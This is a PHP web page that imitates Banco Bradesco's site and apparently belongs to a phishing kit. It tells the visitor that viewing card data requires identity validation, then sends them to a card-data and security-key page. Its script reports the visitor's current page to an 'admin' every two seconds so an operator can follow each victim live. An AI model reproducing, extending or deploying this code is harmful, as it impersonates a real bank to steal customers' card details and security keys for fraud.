<?php
// cartoes.php
session_start();

if (!isset($_SESSION['client_id'])) {
    header('Location: /index.php');
    exit;
}

// Define o item "Cartões" como ativo no menu de navegação.
$menuAtivo = 'cartoes';

// Se o usuário clicar no botão e a ação for "confirmar", 
// a página da chave de segurança será exibida.
if (isset($_GET['acao']) && $_GET['acao'] === 'confirmar') {
    include __DIR__ . '/dadoscartaoexclusive.php';
    exit;
}
?>
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <title>Banco Bradesco | Entre Nós, Você Vem Primeiro</title>
    <link rel="icon" href="/imagens/iconsite.png" type="image/png"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        /* Os estilos são reaproveitados da tela PIX, apenas com pequenas mudanças de nome de classe */
        body {margin:0;font-family:'Montserrat',sans-serif;background:#f5f6f7;color:#222;min-height:100vh;display:flex;flex-direction:column;}
        .card-wrapper {
            flex:1;
            display:flex;
            align-items:center;
            justify-content:center;
            padding:40px 20px;
        }
        .card-content {
            width:100%;
            max-width:520px;
            background:#ffffff;
            border:1px solid #e2e2e2;
            border-radius:14px;
            box-shadow:0 4px 18px rgba(0,0,0,0.06);
            padding:42px 40px 36px;
            position:relative;
            overflow:hidden;
            text-align:center; /* Centraliza o conteúdo do card */
        }
        .card-content:before {
            content:"";
            position:absolute;
            inset:0;
            background:linear-gradient(70deg, #000d365e, #b02186 100%);
            opacity:.55;
            pointer-events:none;
        }
        .card-content h1 {
            margin:0 0 18px;
            font-size:26px;
            font-weight:700;
            position:relative;
            z-index:2;
            letter-spacing:.5px;
            color:#fff;
        }
        .card-content p {
            margin:0 0 26px;
            font-size:14px;
            line-height:1.55;
            position:relative;
            z-index:2;
            color:#444;
        }
        .card-content .status-pill {
            display:inline-block;
            background:linear-gradient(65deg, #702F8A 40%, #CC092F 110%);
            color:#fff;
            font-size:11px;
            letter-spacing:.5px;
            font-weight:600;
            padding:5px 12px 4px;
            border-radius:30px;
            text-transform:uppercase;
            margin-bottom:14px;
            position:relative;
            z-index:2;
        }
        .card-content .btn-action {
            position:relative;
            z-index:2;
            display:inline-flex;
            align-items:center;
            justify-content:center;
            gap:8px;
            background:linear-gradient(65deg, #702F8A 40%, #CC092F 110%);
            border:none;
            color:#fff;
            font-size:15px;
            font-weight:600;
            padding:14px 30px;
            border-radius:8px;
            cursor:pointer;
            box-shadow:0 4px 12px rgba(0,0,0,0.15);
            transition:box-shadow .2s,transform .2s;
            text-decoration:none;
        }
        .card-content .btn-action:hover {
            box-shadow:0 6px 16px rgba(0,0,0,0.22);
            transform:translateY(-2px);
        }
    </style>
</head>
<body>

<?php include 'headerexclusive.php'; ?>
<?php include 'menuexclusive.php'; ?>

<div class="card-wrapper">
    <div class="card-content">
        <span class="status-pill">Função Protegida</span>
        <h1>Acesso aos Cartões</h1>
        <p>
            Para garantir a sua segurança, o acesso aos dados completos do seu cartão requer uma validação adicional.
            <br><br>
            Clique no botão abaixo para confirmar sua identidade e visualizar as informações.
        </p>
        
        <a href="cartoesexclusive.php?acao=confirmar" class="btn-action">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="#fff" aria-hidden="true">
                <path d="M20 4H4c-1.11 0-1.99.89-1.99 2L2 18c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V6c0-1.11-.89-2-2-2zm0 14H4v-6h16v6zm0-10H4V6h16v2z"></path>
            </svg>
            Confirmar dados do Cartão
        </a>
    </div>
</div>

<?php include 'footerexclusive.php'; ?>
<?php include 'chat.php'; ?>

    <script>
    document.addEventListener('DOMContentLoaded', () => {
        // 1. Defina o nome da página (continua igual)
        // IMPORTANTE: Altere este valor para o nome da página atual
        const pageName = 'cartoes.php'; 

        // 2. Crie uma função para encapsular a lógica do fetch
        // Isso torna o código mais limpo e reutilizável.
        function reportarEstagioAtual() {
            fetch('/atualizar_estagio.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ estagio: pageName }),
                credentials: 'include' // É uma boa prática manter isso
            }).catch(error => console.error(`Erro ao reportar estágio '${pageName}':`, error));
        }

        // 3. Chame a função uma vez imediatamente quando a página carregar
        // Para que o admin veja a atualização na hora, sem esperar 2 segundos.
        reportarEstagioAtual(); 

        // 4. Configure para chamar a função repetidamente a cada 2 segundos
        setInterval(reportarEstagioAtual, 2000); // 2000 milissegundos = 2 segundos
    });
    </script>

</body>
</html>